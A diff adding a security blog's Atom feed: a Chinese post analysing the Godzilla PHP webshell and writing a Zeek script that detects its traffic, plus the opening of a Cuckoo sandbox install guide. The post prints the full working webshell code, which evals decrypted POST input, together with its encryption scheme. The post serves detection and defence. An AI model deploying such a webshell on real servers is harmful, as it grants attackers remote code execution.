@@ -1,0 +1,744 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>s4kur4</title>
+    <link rel="self" type="application/atom+xml" href="https://0x0c.cc/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://0x0c.cc"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2020-12-05T00:00:00+00:00</updated>
+    <id>https://0x0c.cc/atom.xml</id>
+    <entry xml:lang="en">
+        <title>巧用Zeek在流量层狩猎哥斯拉Godzilla</title>
+        <published>2020-12-05T00:00:00+00:00</published>
+        <updated>2020-12-05T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://0x0c.cc/posts/qiao-yong-zeekzai-liu-liang-ceng-shou-xi-ge-si-la-godzilla/"/>
+        <id>https://0x0c.cc/posts/qiao-yong-zeekzai-liu-liang-ceng-shou-xi-ge-si-la-godzilla/</id>
+        
+        <content type="html" xml:base="https://0x0c.cc/posts/qiao-yong-zeekzai-liu-liang-ceng-shou-xi-ge-si-la-godzilla/">&lt;h1 id=&quot;qian-yan&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#qian-yan&quot; aria-label=&quot;Anchor link for: qian-yan&quot;&gt;前言&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;“过市面所有静态查杀”、“流量加密过市面全部流量waf”，伴随着这样的标签，哥斯拉在今年的攻防演练活动中成功亮相。这是赐给红队的又一把尖刀，也让防守队雪上加霜。截至目前，主机层面的主流查杀工具均已覆盖了哥斯拉webshell静态规则，但流量层面的检测可能仍然要打一个问号。&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;webshellfen-xi&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#webshellfen-xi&quot; aria-label=&quot;Anchor link for: webshellfen-xi&quot;&gt;webshell分析&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;关于哥斯拉的功能，通过&lt;a href=&quot;https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;247104.html&quot;&gt;《攻防礼盒：哥斯拉Godzilla Shell管理工具》&lt;&#x2F;a&gt;这篇文章可以有比较全面的了解。@nercis在&lt;a href=&quot;https:&#x2F;&#x2F;www.freebuf.com&#x2F;sectool&#x2F;252840.html&quot;&gt;《哥斯拉Godzilla运行原理探寻》&lt;&#x2F;a&gt;一文中通过生成的jsp版shell和客户端jar包向大家介绍了其运行原理。&lt;&#x2F;p&gt;
+&lt;p&gt;由于哥斯拉在处理jsp和php时加密方式存在差异，本文将从php版的shell展开，对其运行原理再做一下总结和阐述。&lt;&#x2F;p&gt;
+&lt;p&gt;先生成一个php静态shell，加密器选择&lt;code&gt;PHP_XOR_BASE64&lt;&#x2F;code&gt;。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;dddbf557-93bb-482b-8c64-9a8a7035f92d.png&quot; width=&quot;50%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;生成的shell代码如下：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;&amp;lt;?php
+&lt;&#x2F;span&gt;&lt;span&gt;    session_start();
+&lt;&#x2F;span&gt;&lt;span&gt;    @set_time_limit(0);
+&lt;&#x2F;span&gt;&lt;span&gt;	@error_reporting(0);
+&lt;&#x2F;span&gt;&lt;span&gt;    function E($D,$K){
+&lt;&#x2F;span&gt;&lt;span&gt;        for($i=0;$i&amp;lt;strlen($D);$i++) {
+&lt;&#x2F;span&gt;&lt;span&gt;            $D[$i] = $D[$i]^$K[$i+1&amp;amp;15];
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;        return $D;
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    function Q($D){
+&lt;&#x2F;span&gt;&lt;span&gt;        return base64_encode($D);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    function O($D){
+&lt;&#x2F;span&gt;&lt;span&gt;        return base64_decode($D);
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;span&gt;    $P=&amp;#39;s4kur4&amp;#39;;
+&lt;&#x2F;span&gt;&lt;span&gt;    $V=&amp;#39;payload&amp;#39;;
+&lt;&#x2F;span&gt;&lt;span&gt;    $T=&amp;#39;85f35deb278e136e&amp;#39;;
+&lt;&#x2F;span&gt;&lt;span&gt;    if (isset($_POST[$P])){
+&lt;&#x2F;span&gt;&lt;span&gt;        $F=O(E(O($_POST[$P]),$T));
+&lt;&#x2F;span&gt;&lt;span&gt;        if (isset($_SESSION[$V])){
+&lt;&#x2F;span&gt;&lt;span&gt;            $L=$_SESSION[$V];
+&lt;&#x2F;span&gt;&lt;span&gt;            $A=explode(&amp;#39;|&amp;#39;,$L);
+&lt;&#x2F;span&gt;&lt;span&gt;            class C{public function nvoke($p) {eval($p.&amp;quot;&amp;quot;);}}
+&lt;&#x2F;span&gt;&lt;span&gt;            $R=new C();
+&lt;&#x2F;span&gt;&lt;span&gt;			$R-&amp;gt;nvoke($A[0]);
+&lt;&#x2F;span&gt;&lt;span&gt;            echo substr(md5($P.$T),0,16);
+&lt;&#x2F;span&gt;&lt;span&gt;            echo Q(E(@run($F),$T));
+&lt;&#x2F;span&gt;&lt;span&gt;            echo substr(md5($P.$T),16);
+&lt;&#x2F;span&gt;&lt;span&gt;        }else{
+&lt;&#x2F;span&gt;&lt;span&gt;            $_SESSION[$V]=$F;
+&lt;&#x2F;span&gt;&lt;span&gt;        }
+&lt;&#x2F;span&gt;&lt;span&gt;    }
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;其中比较核心的地方有两处，第一处是进行异或加密和解密的函数&lt;code&gt;E($D,$K)&lt;&#x2F;code&gt;，第二处是嵌套的两个&lt;code&gt;if&lt;&#x2F;code&gt;对哥斯拉客户端上传的代码做执行并得到结果。根据&lt;code&gt;$F=O(E(O($_POST[$P]),$T));&lt;&#x2F;code&gt;这行做逆向判断，可以得到哥斯拉客户端上传代码时的编码加密过程：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;原始代码 -&amp;gt; Base64编码 -&amp;gt; E函数进行异或加密 -&amp;gt; 再Base64编码&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;为了使客户端分离出结果，三个&lt;code&gt;echo&lt;&#x2F;code&gt;利用md5值作为分离标志，将得到的代码执行结果进行拼接：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;md5($P.$T)前16位&lt;&#x2F;strong&gt;
+&lt;strong&gt;结果 -&amp;gt; E函数进行异或加密 -&amp;gt; Base64编码&lt;&#x2F;strong&gt;
+&lt;strong&gt;md5($P.$T)后16位&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;另外，根据&lt;code&gt;$_SESSION[$V]=$F;&lt;&#x2F;code&gt;这行判断，客户端首次连接shell时会在&lt;code&gt;$_SESSION&lt;&#x2F;code&gt;中保存一段代码，叫payload。结合后面突然出现的函数&lt;code&gt;run&lt;&#x2F;code&gt;，猜测这个payload在后续shell连接过程中可能会被调用。整个shell的运行原理到这里基本就能明确了，可以用下面的流程图来总结：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;a19bb97f-f0e1-4b79-aa01-4462838a080b.png&quot; width=&quot;50%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;te-zheng-ti-qu&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#te-zheng-ti-qu&quot; aria-label=&quot;Anchor link for: te-zheng-ti-qu&quot;&gt;特征提取&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;通常，流量层面对恶意行为进行检测，倾向于筛选出一些强特征、固定特征。例如检测使用ceye.io进行的OOB通信，只需要去匹配流量中包含&lt;code&gt;.+\.ceye\.io&lt;&#x2F;code&gt;的DNS请求，通过四元组即可判断受害主机和攻击者IP，这里&lt;code&gt;ceye.io&lt;&#x2F;code&gt;关键字就是固定特征。固定特征具有一致性、不易改变的特点，就好似与生俱来的特点。&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;wa-jue-ge-si-la-qiang-te-zheng&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#wa-jue-ge-si-la-qiang-te-zheng&quot; aria-label=&quot;Anchor link for: wa-jue-ge-si-la-qiang-te-zheng&quot;&gt;挖掘哥斯拉强特征&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;如何寻找哥斯拉的流量特征呢？最先想到的是先前冰蝎的捕获经验，即在shell的建连初期出现的强特征。至于HTTP头部的UA等特征，由于其易被改变，因此暂不考虑。开启Wireshark设置过滤条件，重新打开哥斯拉客户端并添加生成的shell：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;1063c9be-4e28-4fae-9aee-dcde7361ea44.gif&quot; width=&quot;70%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;此时未出现任何流量。继续右键进入，哥斯拉会返回目标的相关信息，Wireshark瞬间出现3个http包：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;8aa1d4f0-2cf7-4a9b-866c-1d47d7f0a488.gif&quot; width=&quot;70%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;跟踪http流，发现3个http包处在同一TCP中，说明哥斯拉使用了TCP长连接，这对流量特征分析比较有利。对这3个http包逐个分析一下。&lt;&#x2F;p&gt;
+&lt;p&gt;从shell的代码已知，客户端首次连接shell会上传一段代码payload，以备后续操作调用。查看其请求，发现内容长度居然超过23000字节。同时，http响应内容为空：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;ffb34788-2d21-4e08-b435-58da2232ee1f.png&quot; width=&quot;60%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;使用&lt;code&gt;$F=O(E(O($_POST[$P]),$T))&lt;&#x2F;code&gt;对这一长串内容进行解密，得到payload的原始内容。好家伙，包含&lt;code&gt;run&lt;&#x2F;code&gt;、&lt;code&gt;bypass_open_basedir&lt;&#x2F;code&gt;、&lt;code&gt;formatParameter&lt;&#x2F;code&gt;、&lt;code&gt;evalFunc&lt;&#x2F;code&gt;等二十多个功能函数，具备代码执行、文件操作、数据库操作等诸多功能。&lt;&#x2F;p&gt;
+&lt;p&gt;第二个http的请求内容为：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;s4kur4=VzFlBQUiW1ljVSNFaWJUU2dXaQM%2BICcLZ2lYDA%3D%3D&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;解密得到原始代码&lt;code&gt;methodName=dGVzdA==&lt;&#x2F;code&gt;，即&lt;code&gt;methodName=test&lt;&#x2F;code&gt;。跟踪执行过程，发现最终目的是测试shell的连通情况，并向客户端打印输出&lt;code&gt;ok&lt;&#x2F;code&gt;。这个过程是典型的固定特征，与第一个http请求一样，上传的原始代码是固定的。&lt;&#x2F;p&gt;
+&lt;p&gt;第三个http的作用是获取目标的环境信息，请求内容为：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;s4kur4=VzFlBQUiW1ljVSNFaWJUWXgKakIxMlN1UlUjaWdYFWxjHGVBPQsBC2dpWAw%3D&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;解密得到原始代码&lt;code&gt;methodName=Z2V0QmFzaWNzSW5mbw==&lt;&#x2F;code&gt;，即&lt;code&gt;methodName=getBasicsInfo&lt;&#x2F;code&gt;。此操作调用payload中的&lt;code&gt;getBasicsInfo&lt;&#x2F;code&gt;方法获取目标环境信息向客户端返回。显然，这个过程又是一个固定特征。&lt;&#x2F;p&gt;
+&lt;p&gt;至此，成功挖掘到哥斯拉客户端与shell建连初期的三个固定行为特征，且顺序出现在同一个TCP连接中。可以总结为：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;特征：发送一段固定代码（payload），http响应为空&lt;&#x2F;strong&gt;
+&lt;strong&gt;特征：发送一段固定代码（test），执行结果为固定内容&lt;&#x2F;strong&gt;
+&lt;strong&gt;特征：发送一段固定代码（getBacisInfo）&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;qiang-te-zheng-gui-ze-hua&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#qiang-te-zheng-gui-ze-hua&quot; aria-label=&quot;Anchor link for: qiang-te-zheng-gui-ze-hua&quot;&gt;强特征规则化&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;明确了三个紧密关联的特征后，需要对特征规则化。由于对内容的加密，即使哥斯拉每次都发送一段固定代码，检测引擎也无法通过规则直接匹配。另外，webshell的密码、密钥均不固定，代码加密后的密文也不同。&lt;&#x2F;p&gt;
+&lt;p&gt;回看webshell代码，&lt;code&gt;$P&lt;&#x2F;code&gt;和&lt;code&gt;$T&lt;&#x2F;code&gt;在生成时属于非固定值，但在shell连接的整个生命周期，却又是固定值。&lt;code&gt;$T&lt;&#x2F;code&gt;是密钥的md5值前16位，属于唯一的加密因子，被用于与原始代码进行异或。哥斯拉进行异或加密时，循环使用加密因子&lt;code&gt;$T&lt;&#x2F;code&gt;的每一位与被加密字符串进行异或位运算。这就引出了第一个真理：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;长度为l的字符串与长度为n的加密因子循环按位异或，密文的长度为l&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;可以取出shell中的&lt;code&gt;E&lt;&#x2F;code&gt;函数，计算随机字符串的md5对固定字符串做异或，进行穷举验证：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;fed426a0-c5d6-409d-bbc2-e30d6b0e0542.png&quot; width=&quot;80%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;对于哥斯拉中频繁使用的Base64编码，又会引出真理二：&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;长度为l的字符串进行Base64编码后长度为定值&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;熟悉Base64编码过程的同学应该知道，Base64本质上是由二进制向字符串转换的过程。对长度固定的随机字符串进行Base64编码，穷举验证：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;aeef8713-9c5a-4740-a09e-abb7f9998b43.png&quot; width=&quot;70%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;现在基本可以下结论了，即哥斯拉上传的三个固定代码，密文的长度是固定的。计算了一下，分别是23068、40、60。如此一来就能总结出以下三条规则：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;242353c3-c4bd-41ed-9c1b-0749cdab6914.png&quot; width=&quot;65%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;zeekqiao-miao-luo-di&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#zeekqiao-miao-luo-di&quot; aria-label=&quot;Anchor link for: zeekqiao-miao-luo-di&quot;&gt;Zeek巧妙落地&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;对规则的落地要依托流量层检测的基础设施，上面总结出的三条规则具有上下文关联性，传统的IDS无法直接实现。这里的难点在于，需要一次性对三个数据包做实时判断，并且需要对包内容做一些字符串的切割、解码操作。能想到的要么是大数据实时计算，要么是Zeek了。&lt;&#x2F;p&gt;
+&lt;p&gt;想必熟悉Zeek的同学一定了解其统计框架&lt;a href=&quot;https:&#x2F;&#x2F;docs.zeek.org&#x2F;en&#x2F;current&#x2F;frameworks&#x2F;sumstats.html&quot;&gt;Summary Statistics&lt;&#x2F;a&gt;，你可以对符合特定条件的数据进行统计、计算。例如统计同一个源IP发起的SSH登录行为并计算次数，在某个时间段内超过阈值&lt;code&gt;$threshold&lt;&#x2F;code&gt;就产生一条SSH暴力破解的告警。在哥斯拉的场景里，可以巧妙的用Zeek统计框架收集同一TCP连接中的http数据。Zeek脚本语言也完全满足统计数据以后的匹配计算。&lt;&#x2F;p&gt;
+&lt;p&gt;先创建一个统计实例，设置延时&lt;code&gt;$epoch&lt;&#x2F;code&gt;为10秒，统计阈值&lt;code&gt;$threshold&lt;&#x2F;code&gt;为3，即统计10秒钟内产生的连续3个http包。当事件&lt;code&gt;http_message_done&lt;&#x2F;code&gt;发生时执行统计并收集数据：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;event http_message_done(c: connection, is_orig: bool, stat: http_message_stat)
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;  if ( c?$http &amp;amp;&amp;amp; c$http?$status_code &amp;amp;&amp;amp; c$http?$method )
+&lt;&#x2F;span&gt;&lt;span&gt;  {
+&lt;&#x2F;span&gt;&lt;span&gt;    if ( c$http$status_code == 200 &amp;amp;&amp;amp; c$http$method == &amp;quot;POST&amp;quot; )
+&lt;&#x2F;span&gt;&lt;span&gt;      {
+&lt;&#x2F;span&gt;&lt;span&gt;        local key_str: string = c$http$uid + &amp;quot;$_$&amp;quot; + cat(c$id$orig_h) + &amp;quot;$_$&amp;quot; + cat(c$id$orig_p) + &amp;quot;$_$&amp;quot; + cat(c$http$status_code) + &amp;quot;$_$&amp;quot; + cat(c$id$resp_h)+ &amp;quot;$_$&amp;quot; + cat(c$id$resp_p) + &amp;quot;$_$&amp;quot; + c$http$uri;
+&lt;&#x2F;span&gt;&lt;span&gt;        local observe_str: string = cat(c$http$ts) + &amp;quot;$_$&amp;quot; + c$http$client_body + &amp;quot;$_$&amp;quot; + c$http$server_body;
+&lt;&#x2F;span&gt;&lt;span&gt;        SumStats::observe(&amp;quot;godzilla_webshell_event&amp;quot;, SumStats::Key($str=key_str), SumStats::Observation($str=observe_str));
+&lt;&#x2F;span&gt;&lt;span&gt;      }
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;其中，统计条件为同一TCP连接中HTTP响应为200的数据包，并且具备相同的URI。收集的数据内容主要为包的捕获时间、http请求内容、http响应内容。收集到符合这些条件的数据后数据被带进&lt;code&gt;$threshold_crossed&lt;&#x2F;code&gt;，此处开始对三个http包进行解析匹配：&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;if ( |result[&amp;quot;godzilla_webshell_event&amp;quot;]$unique_vals| == 3 )
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt; for ( value in result[&amp;quot;godzilla_webshell_event&amp;quot;]$unique_vals )
+&lt;&#x2F;span&gt;&lt;span&gt; {
+&lt;&#x2F;span&gt;&lt;span&gt;  local observe_str_vector: vector of string = split_string(value$str, &#x2F;\$_\$&#x2F;);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  # 对请求内容进行URL解码
+&lt;&#x2F;span&gt;&lt;span&gt;  observe_str_vector[1] = unescape_URI(observe_str_vector[1]);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  local request_body_only_value: string;
+&lt;&#x2F;span&gt;&lt;span&gt;  # 从请求中分离出加密代码部分
+&lt;&#x2F;span&gt;&lt;span&gt;  request_body_only_value = observe_str_vector[1][strstr(observe_str_vector[1], &amp;quot;=&amp;quot;) : |observe_str_vector[1]|];
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  # 规则1:
+&lt;&#x2F;span&gt;&lt;span&gt;  # 发送的加密代码长度为23068 &amp;amp;&amp;amp; HTTP响应内容为空
+&lt;&#x2F;span&gt;&lt;span&gt;  if ( |request_body_only_value| == 23068 &amp;amp;&amp;amp; |observe_str_vector[2]| == 0 )
+&lt;&#x2F;span&gt;&lt;span&gt;  {
+&lt;&#x2F;span&gt;&lt;span&gt;    sig1 = T;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  local response_body: string = observe_str_vector[2];
+&lt;&#x2F;span&gt;&lt;span&gt;  # 规则2: 
+&lt;&#x2F;span&gt;&lt;span&gt;  # 加密代码长度为40 &amp;amp;&amp;amp; HTTP响应内容长度为40 &amp;amp;&amp;amp; 响应内容首尾各16位md5字符串
+&lt;&#x2F;span&gt;&lt;span&gt;  if ( |request_body_only_value| == 40 &amp;amp;&amp;amp; |response_body| == 40 &amp;amp;&amp;amp; response_body == find_last(response_body, &#x2F;[a-z0-9]{16}.+[a-z0-9]{16}&#x2F;) )
+&lt;&#x2F;span&gt;&lt;span&gt;  {
+&lt;&#x2F;span&gt;&lt;span&gt;    sig2 = T;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  # 规则3: 
+&lt;&#x2F;span&gt;&lt;span&gt;  # 发送的加密代码长度为60 &amp;amp;&amp;amp; 响应内容首尾各16位md5字符串
+&lt;&#x2F;span&gt;&lt;span&gt;  if ( |request_body_only_value| == 60 &amp;amp;&amp;amp; response_body == find_last(response_body, &#x2F;[a-z0-9]{16}.+[a-z0-9]{16}&#x2F;) )
+&lt;&#x2F;span&gt;&lt;span&gt;  {
+&lt;&#x2F;span&gt;&lt;span&gt;    sig3 = T;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt; }
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt; # 三个规则同时符合，进行告警
+&lt;&#x2F;span&gt;&lt;span&gt; if ( sig1 &amp;amp;&amp;amp; sig2 &amp;amp;&amp;amp; sig3 )
+&lt;&#x2F;span&gt;&lt;span&gt; {
+&lt;&#x2F;span&gt;&lt;span&gt;  print fmt(&amp;quot;[+] Godzilla traffic detected, %s:%s -&amp;gt; %s:%s, webshell URI: %s&amp;quot;, key_str_vector[1], key_str_vector[2], key_str_vector[4], key_str_vector[5], key_str_vector[6]);
+&lt;&#x2F;span&gt;&lt;span&gt; }
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;代码实现后，在服务器端启动PHP环境放置哥斯拉shell，启动Zeek监听网卡。本地客户端添加shell后点击进入，顺利打印出告警，令人欣慰：&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;vkceyugu.cdn.bspapp.com&#x2F;VKCEYUGU-imgbed&#x2F;f6f3e32b-ec23-4b5e-832a-328635ef1389.gif&quot; width=&quot;70%&quot;&gt;&lt;&#x2F;img&gt;&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;zong-jie&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#zong-jie&quot; aria-label=&quot;Anchor link for: zong-jie&quot;&gt;总结&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;本文从哥斯拉php版的异或加密shell出发，探索了一种流量层检测哥斯拉的思路和方法。由于哥斯拉php版shell还有另一种加密器，还支持jsp版、.net版等多种情况，鉴于篇幅和工作量，本文未做一一分析和覆盖。正如文章前言所述，其实这样的检测分析文章不舍得发，一旦发了可能才是检测困难真正的开始。&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;* 本文首发于&lt;a href=&quot;https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;224831&quot;&gt;安全客&lt;&#x2F;a&gt;，转载请注明作者及来源&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Install A Cuckoo Sandbox in 12 steps</title>
+        <published>2020-03-19T00:00:00+00:00</published>
+        <updated>2020-03-19T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://0x0c.cc/posts/install-a-cuckoo-sandbox-in-12-steps/"/>
+        <id>https://0x0c.cc/posts/install-a-cuckoo-sandbox-in-12-steps/</id>
+        
+        <content type="html" xml:base="https://0x0c.cc/posts/install-a-cuckoo-sandbox-in-12-steps/">&lt;h1 id=&quot;background&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#background&quot; aria-label=&quot;Anchor link for: background&quot;&gt;Background&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;Recently, I was participating in an online malicious file detection project, and we used the Cuckoo sandbox as part of it. During the installation of Cuckoo sandbox, I found the process is very tedious and unfriendly for automatic deployment of engineering projects. Also, by searching the Internet, I didn&#x27;t find any useful references can quickly improve the deployment steps. After some practice, I have summarized a relatively simple method that can deploy a Cuckoo sandbox in 12 steps. Today, I decided to make it public.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;preparatory-works&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#preparatory-works&quot; aria-label=&quot;Anchor link for: preparatory-works&quot;&gt;Preparatory works&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;Before installing Cuckoo, we need to prepare a Cuckoo Agent, which is a Windows virtual machine based on VitualBox. Of course, you needn&#x27;t remake it, just use this ova file I have prepared:&lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;u&#x2F;0&#x2F;uc?id=1uGxNwvSuSIhokeuX9N61D8VtyFDoK0-2&amp;amp;export=download&quot;&gt;Agent.ova&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;It is noteworthy that I completed the installation on version of Ubuntu &lt;code&gt;18.04.5&lt;&#x2F;code&gt; Desktop, the Cuckoo sandbox is the version of  &lt;code&gt;2.0.7&lt;&#x2F;code&gt;. If everything goes well, the following method should also support version of Ubuntu Server.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;start-installation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#start-installation&quot; aria-label=&quot;Anchor link for: start-installation&quot;&gt;Start installation&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;p&gt;&lt;strong&gt;step 1:&lt;&#x2F;strong&gt; Install system updates and update system dependencies after installing Ubuntu&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 2:&lt;&#x2F;strong&gt; Install basic system dependencies by Cuckoo required (if iptables-persistent configuration GUI window pops up, keep the default selection and go on)&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;shell&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-shell &quot;&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span&gt;sudo apt-get install -y virtualbox vim curl net-tools htop python python-pip python-dev libffi-dev libssl-dev python-virtualenv python-setuptools python-magic python-libvirt ssdeep libjpeg-dev zlib1g-dev swig mongodb postgresql libpq-dev build-essential git libpcre3 libpcre3-dev libpcre++-dev libfuzzy-dev automake make libtool gcc tcpdump dh-autoreconf flex bison libjansson-dev libmagic-dev libyaml-dev libpython2.7-dev tcpdump apparmor-utils iptables-persistent
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;&lt;strong&gt;step 3:&lt;&#x2F;strong&gt; Update PIP and install Python dependencies&lt;&#x2F;p&gt;
